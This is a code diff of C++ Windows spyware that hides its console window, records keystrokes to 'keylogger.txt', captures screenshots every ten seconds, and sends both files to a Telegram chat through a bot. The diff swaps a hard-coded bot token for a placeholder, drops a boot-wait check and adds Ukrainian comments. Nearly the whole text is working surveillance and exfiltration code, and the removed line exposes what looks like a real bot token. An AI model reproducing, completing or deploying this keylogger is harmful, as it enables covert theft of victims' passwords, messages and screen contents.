@@ -288,16 +288,15 @@ BOOL WINAPI SaveBitmap(WCHAR* wPath)
 }
 
 
-void TakeScreenshot()
-{
+void TakeScreenshot() {
 	WCHAR wPath[MAX_PATH] = L"screenshot.jpg";
 
-	while (true)
-	{
+	for (int i = 0; i < 60; ++i) {  // Зробити 60 скріншотів
 		SaveBitmap(wPath);
-		Sleep(10000);
+		Sleep(10000);  // Кожні 10 секунд
 	}
 }
+
 
 void Loggin() {
 	const char* output_filename = "keylogger.txt";
@@ -313,54 +312,52 @@ void Loggin() {
 
 
 void bot() {
-	TgBot::Bot bot("7153277039:AAFn8kOI_lbRRUFeg0KoJgfN8cqGE0zL0wI");
+	TgBot::Bot bot("YOUR_BOT_TOKEN");
 
 	const std::string filename = "keylogger.txt";
 	const std::string photoMimeType1 = "text/plain";
 	const std::string photoFilePath = "screenshot.jpg";
 	const std::string photoMimeType = "image/jpeg";
+
 	try {
 		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
-		TgBot::TgLongPoll longPoll(bot);
+
+		// Цикл відправки файлів у бот
 		while (true) {
 			bot.getApi().sendDocument(6884529861, TgBot::InputFile::fromFile(photoFilePath, photoMimeType));
 			bot.getApi().sendDocument(6884529861, TgBot::InputFile::fromFile(filename, photoMimeType1));
-			printf("Long poll started\n");
-			Sleep(10);
+
+			printf("Files sent to bot.\n");
+
+			// Затримка між відправками
+			std::this_thread::sleep_for(std::chrono::minutes(5));
+
+			// Запуск Long Poll для обробки повідомлень
+			TgBot::TgLongPoll longPoll(bot);
 			longPoll.start();
 		}
 	}
 	catch (TgBot::TgException& e) {
-		printf("error: %s\n", e.what());
+		printf("Error: %s\n", e.what());
 	}
-
 }
+
 
 int main() {
 	std::setlocale(LC_ALL, "rus");
-	// Call the visibility of window function.
+
+	// Виклик функції приховування вікна
 	Stealth();
 
-	// Check if the system is still booting up
-#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
-	while (IsSystemBooting())
-	{
-		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
-		Sleep(10000); // Wait for 10 seconds before checking again
-	}
-#endif
-#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
-	std::cout << "Skipping boot metrics check.\n";
-#endif
-
+	// Створення потоків
 	std::thread t1(TakeScreenshot);
 	std::thread t2(Loggin);
 	std::thread t3(bot);
+
+	// Очікування завершення потоків
 	t1.join();
 	t2.join();
 	t3.join();
 
+	return 0;
 }
-
-
-
